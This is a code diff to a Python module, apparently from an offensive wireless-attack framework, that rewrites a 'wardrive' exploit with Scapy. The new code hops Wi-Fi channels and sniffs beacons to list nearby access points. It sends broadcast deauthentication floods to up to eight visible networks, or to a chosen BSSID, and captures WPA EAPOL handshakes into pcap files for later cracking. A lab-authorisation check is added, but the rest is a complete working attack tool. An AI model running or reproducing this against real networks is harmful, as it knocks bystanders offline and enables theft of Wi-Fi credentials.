@@ -16,11 +16,14 @@ from __future__ import annotations
 import logging
 import shutil
 import subprocess
+import threading
+import time
 from pathlib import Path
 from typing import List
 
 from wirelessxpl.core.exploit import *
 from wirelessxpl.core.os_guard import OSRequirement, requires_os
+from wirelessxpl.modules.generic.wifi._disclaimer import require_authorised_lab
 
 logger = logging.getLogger(__name__)
 
@@ -41,6 +44,7 @@ class Exploit(Exploit):
     interface = OptString("wlan0mon", "Monitor-mode interface")
     target_bssid = OptString("", "Optional fixed BSSID target")
     channel = OptString("", "Optional fixed channel")
+    duration    = OptInteger(60, "Total wardrive duration in seconds")
     scan_seconds = OptInteger(30, "Passive scan duration per cycle")
     deauth_burst = OptInteger(5, "Deauth frames per cycle")
     cycles = OptInteger(3, "Number of scan/deauth cycles")
@@ -82,42 +86,96 @@ class Exploit(Exploit):
         return f"Interface {iface} not found - connect wireless adapter and enable monitor mode"
 
     def run(self) -> None:
-        for tool in ("airodump-ng", "aireplay-ng"):
-            if not self._require_tool(tool):
-                return
+        require_authorised_lab()
+        try:
+            from scapy.all import (
+                sniff, sendp, wrpcap,
+                RadioTap, Dot11, Dot11Deauth, Dot11Beacon, Dot11Elt, EAPOL,
+            )
+        except ImportError:
+            print_error("Scapy required: pip install scapy")
+            return
 
-        out = Path(str(self.output_dir))
-        out.mkdir(parents=True, exist_ok=True)
-        cap_prefix = str(out / "wardrive")
+        import subprocess
+        iface     = str(self.interface).strip()
+        target_b  = str(self.target_bssid).strip().lower() or None
+        out       = Path(str(self.output_dir)); out.mkdir(parents=True, exist_ok=True)
+        channels  = [1,3,6,9,11,2,4,7,8,10,13]
+        ch_idx    = 0
+        duration  = int(self.duration)
+        burst     = int(self.deauth_burst)
+        end_time  = time.time() + duration
 
-        for i in range(1, int(self.cycles) + 1):
-            scan_cmd: List[str] = [
-                "sudo", "airodump-ng", self.interface, "-w", cap_prefix, "--output-format", "pcap,csv"
-            ]
-            if str(self.channel).strip():
-                scan_cmd.extend(["-c", str(self.channel).strip()])
-            if str(self.target_bssid).strip():
-                scan_cmd.extend(["--bssid", str(self.target_bssid).strip()])
+        aps:   dict = {}    # bssid -> (ssid, ch)
+        eapol_store: dict = {}  # bssid -> list of pkts
+        lock = threading.Lock()
 
-            deauth_cmd: List[str] = [
-                "sudo", "aireplay-ng", "--deauth", str(self.deauth_burst), self.interface
-            ]
-            if str(self.target_bssid).strip():
-                deauth_cmd.extend(["-a", str(self.target_bssid).strip()])
+        def sniff_handler(pkt):
+            if pkt.haslayer(Dot11Beacon):
+                bssid = pkt[Dot11].addr3.lower()
+                if bssid not in aps:
+                    ssid = ''
+                    elt = pkt.getlayer(Dot11Elt)
+                    while elt:
+                        if elt.ID == 0:
+                            try: ssid = elt.info.decode('utf-8', errors='replace')
+                            except: pass
+                        if elt.ID == 3:
+                            try:
+                                ch = int.from_bytes(elt.info, 'big')
+                                rssi = pkt.dBm_AntSignal if hasattr(pkt,'dBm_AntSignal') else -100
+                                with lock: aps[bssid] = (ssid, ch, int(rssi))
+                            except: pass
+                        elt = elt.payload.getlayer(Dot11Elt) if elt.payload else None
+                    if bssid not in aps:
+                        with lock: aps[bssid] = (ssid, channels[ch_idx % len(channels)], -100)
+                    print_status(f"  AP: {bssid}  {ssid}")
+            if pkt.haslayer(EAPOL):
+                bssid = pkt[Dot11].addr1.lower()
+                with lock:
+                    eapol_store.setdefault(bssid, []).append(pkt)
+                    if len(eapol_store[bssid]) >= 4:
+                        print_success(f"[HANDSHAKE] {bssid} — {len(eapol_store[bssid])} EAPOL msgs!")
 
-            print_status("Cycle {}/{}".format(i, self.cycles))
-            print_info("Scan command: {}".format(" ".join(scan_cmd)))
-            print_info("Deauth command: {}".format(" ".join(deauth_cmd)))
+        # Background sniffer
+        sniffer = threading.Thread(
+            target=lambda: sniff(iface=iface, prn=sniff_handler,
+                                 stop_filter=lambda _: time.time() > end_time,
+                                 timeout=duration + 2, store=False),
+            daemon=True,
+        )
+        sniffer.start()
 
-            if self.dry_run:
-                continue
+        cycle = 0
+        while time.time() < end_time:
+            # Channel hop
+            ch = channels[ch_idx % len(channels)]; ch_idx += 1
+            subprocess.run(["iw","dev",iface,"set","channel",str(ch)],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-            try:
-                subprocess.run(scan_cmd, timeout=int(self.scan_seconds), check=False)
-            except subprocess.TimeoutExpired:
-                pass
+            time.sleep(float(self.scan_seconds))
 
-            if str(self.target_bssid).strip():
-                subprocess.run(deauth_cmd, check=False)
+            # Deauth all visible APs (or target)
+            with lock:
+                to_deauth = [target_b] if target_b else list(aps.keys())[:8]
+            for bssid in to_deauth:
+                if time.time() > end_time: break
+                pkt = (RadioTap() /
+                       Dot11(type=0, subtype=12,
+                             addr1='ff:ff:ff:ff:ff:ff',
+                             addr2=bssid, addr3=bssid) /
+                       Dot11Deauth(reason=7))
+                sendp(pkt, iface=iface, count=burst, inter=0.03, verbose=False)
 
-        print_success("Wardriving loop completed. Output prefix: {}".format(cap_prefix))
+            cycle += 1
+            print_status(f"Cycle {cycle}: ch={ch} | APs={len(aps)} | EAPOL={sum(len(v) for v in eapol_store.values())}")
+
+        sniffer.join(timeout=3)
+
+        # Save all EAPOL captures
+        for bssid, pkts in eapol_store.items():
+            if len(pkts) >= 2:
+                fname = out / f"hs_{bssid.replace(':','')}.pcap"
+                wrpcap(str(fname), pkts)
+
+        print_success(f"Wardrive complete: {len(aps)} APs | {len(eapol_store)} EAPOL sessions | output={out}")
